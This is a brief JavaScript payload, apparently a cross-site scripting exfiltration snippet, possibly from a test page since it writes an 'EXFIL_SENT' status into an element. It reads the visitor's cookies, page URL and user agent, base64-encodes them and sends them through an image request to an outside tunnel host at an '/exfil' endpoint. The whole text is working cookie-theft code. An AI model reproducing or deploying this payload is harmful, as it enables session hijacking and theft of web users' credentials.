var info={ua:navigator.userAgent,url:location.href,cookie:document.cookie};
var i=new Image();
i.src='https://influence-barn-expenditures-agriculture.trycloudflare.com/exfil?d='+btoa(JSON.stringify(info));
document.getElementById('r8').textContent='EXFIL_SENT:'+JSON.stringify(info).substring(0,100);
